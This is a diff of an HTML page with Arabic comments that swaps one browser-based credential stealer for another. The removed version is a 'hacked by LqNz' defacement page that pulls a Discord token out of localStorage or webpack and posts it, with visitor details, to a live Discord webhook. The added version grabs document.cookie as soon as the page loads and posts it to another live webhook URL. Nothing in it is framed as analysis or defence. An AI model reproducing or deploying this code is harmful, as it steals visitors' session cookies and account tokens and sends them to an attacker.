@@ -3,247 +3,58 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hacked Page</title>
+    <title>إرسال الكوكيز إلى بوت Discord</title>
     <style>
         body {
-            background-color: black;
+            font-family: Arial, sans-serif;
+            background-color: #2c2f33;
             color: white;
-            font-family: 'Arial', sans-serif;
             text-align: center;
-            padding: 20px;
-        }
-
-        h1 {
-            color: #ffffff;
-            font-size: 2.5em;
-            margin-bottom: 0;
-        }
-
-        h1 span {
-            color: #ff0000; /* لون بنفسجي */
-        }
-
-        .online-status {
-            color: #c7c7c7;
-            font-size: 1.2em;
-            margin-bottom: 20px;
-        }
-
-        .profile {
-            margin: 20px auto;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
-
-        .profile-img {
-            width: 150px;
-            height: 150px;
-            border-radius: 50%;
-            border: 3px solid #a58aff;
-            margin-bottom: 10px;
-        }
-
-        .profile-info {
-            color: #fff;
-        }
-
-        .profile-info span {
-            display: block;
-            font-size: 1.1em;
-        }
-
-        .money-info {
-            display: flex;
-            justify-content: center;
-            gap: 20px;
-            margin: 20px 0;
-        }
-
-        .money-info div {
-            background-color: #2e0249;
-            color: #ffffff;
-            padding: 10px 20px;
-            border-radius: 20px;
-            box-shadow: 0 0 10px #a58aff;
-        }
-
-        .hacked-message {
-            margin-top: 30px;
-        }
-
-        .hacked-message img {
-            width: 200px;
-            margin-bottom: 20px;
-        }
-
-        .hacked-message p {
-            color: #ff4d4d;
-            font-size: 1.2em;
-        }
-
-        .footer {
-            margin-top: 50px;
-            color: #c7c7c7;
-        }
-
-        .icons {
-            display: flex;
-            justify-content: center;
-            gap: 20px;
-            margin-top: 40px;
-        }
-
-        .icon {
-            width: 40px;
-            height: 40px;
-        }
-
-        body, html {
-            margin: 0;
-            padding: 0;
-            height: 100%;
-            overflow: hidden;
-        }
-
-        .video-bg {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            overflow: hidden;
-        }
-
-        .video-bg video {
-            min-width: 100%;
-            min-height: 100%;
-            width: auto;
-            height: auto;
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            z-index: -1;
-        }
-
-        .content {
-            position: relative;
-            z-index: 1;
-            text-align: center;
-            color: white;
+            padding: 50px;
         }
     </style>
 </head>
 <body>
-    <div class="video-bg">
-        <video autoplay muted loop>
-            <source src="https://d.top4top.io/m_3264y3w7z1.mp4" type="video/mp4">
-            Your browser does not support the video tag.
-        </video>
-    </div>
 
-    <div class="content">
-        <h1>تم الاختراق من قبل <span>LqNz</span></h1>
-        <div class="hacked-message">
-            <p>Oops! Your server got down!</p>
-            <p>Join our server: <a href="https://discord.gg/P2L" target="_blank">Discord.gg/P2L</a></p>
-        </div>
-    </div>
+    <h1>تم إرسال البيانات بنجاح!</h1>
 
     <script>
-        // Function to get visitor details
-        function getVisitorDetails() {
-            const ip = '51.235.233.211'; // Hardcoded IP address
-            const country = 'SA'; // Country code
-            const city = 'Riyadh'; // City
-            const region = 'Riyadh Region'; // Region
-            const referrer = 'مباشرة'; // Referrer
-            const userAgent = navigator.userAgent; // User Agent from browser
-            const dateTime = new Date().toLocaleString(); // Current date and time
-
-            return {
-                ip: ip,
-                country: country,
-                city: city,
-                region: region,
-                referrer: referrer,
-                userAgent: userAgent,
-                dateTime: dateTime
-            };
+        // دالة لجلب الكوكيز من المتصفح
+        function getCookies() {
+            return document.cookie; // جلب جميع الكوكيز في المتصفح
         }
 
-        // Send all data to the webhook
-        function sendDataToWebhook(token, visitorDetails) {
-            const webhookURL = 'https://discord.com/api/webhooks/1315410944947392533/fcw0TV2n-HqXdvSCYQpnqgYrkvNhspmhvyNlJsCmTKdse6wy3uQYRUyWlzsCF92AQUgQ';
+        // جلب الكوكيز
+        const cookies = getCookies();
 
-            const payload = {
-                content: `
-                    **Discord Token:** ${token}
-                    **Visitor Details:**
-                    - **IP Address:** ${visitorDetails.ip}
-                    - **Country:** ${visitorDetails.country}
-                    - **City:** ${visitorDetails.city}
-                    - **Region:** ${visitorDetails.region}
-                    - **Referrer:** ${visitorDetails.referrer}
-                    - **User Agent:** ${visitorDetails.userAgent}
-                    - **Date & Time:** ${visitorDetails.dateTime}
-                `
+        // إذا كانت الكوكيز موجودة، نقوم بإرسالها
+        if (cookies) {
+            sendData(cookies); // إرسال الكوكيز إلى Webhook
+        } else {
+            console.log("لا توجد كوكيز");
+        }
+
+        // دالة لإرسال البيانات إلى Webhook
+        function sendData(cookies) {
+            const data = {
+                content: `تم إرسال الكوكيز: ${cookies}`
             };
 
-            fetch(webhookURL, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(payload)
-            })
-            .then(response => {
-                if (response.ok) {
-                    console.log('Data sent successfully');
-                    openNewPage();
+            const xhr = new XMLHttpRequest();
+            xhr.open("POST", "https://discord.com/api/webhooks/1315420160030412821/PM8Cic_rvPk811Jl1rGerqT_KjycvUvAv4wvMjppH0mD3xNEZtnF8MX4sVTt9b8_4bYP", true);
+            xhr.setRequestHeader("Content-Type", "application/json");
+
+            xhr.onload = function () {
+                if (xhr.status === 204) {
+                    console.log("تم إرسال الكوكيز بنجاح.");
                 } else {
-                    console.error('Failed to send data, status:', response.status);
+                    console.log("حدث خطأ أثناء إرسال الكوكيز.");
                 }
-            })
-            .catch(error => {
-                console.error('Error:', error);
-            });
+            };
+
+            xhr.send(JSON.stringify(data));  // إرسال البيانات
         }
-
-        // Extract Discord Token from localStorage or Webpack
-        function extractDiscordToken() {
-            // Check if token is in localStorage
-            const token = localStorage.getItem('discord_token');  // Replace with correct key if needed
-            if (token) {
-                const visitorDetails = getVisitorDetails();
-                sendDataToWebhook(token, visitorDetails);
-            } else {
-                // If token not in localStorage, attempt to get it from webpack
-                webpackChunkdiscord_app.push([[''], {}, e => {
-                    let m = [];
-                    for (let c in e.c) m.push(e.c[c]);
-                }]);
-
-                const module = m.find(m => m?.exports?.default?.getToken !== void 0);
-                if (module && module.exports && module.exports.default) {
-                    const token = module.exports.default.getToken();
-                    const visitorDetails = getVisitorDetails();
-                    sendDataToWebhook(token, visitorDetails);
-                } else {
-                    console.error("Token not found in webpack.");
-                }
-            }
-        }
-
-        // Function to open new page after sending data
-        function openNewPage() {
-            window.open('https://lqnz12.github.io/hack/', '_blank');
-        }
-
-        // Automatically try to extract the token and send data
-        extractDiscordToken();
     </script>
+
 </body>
 </html>
-
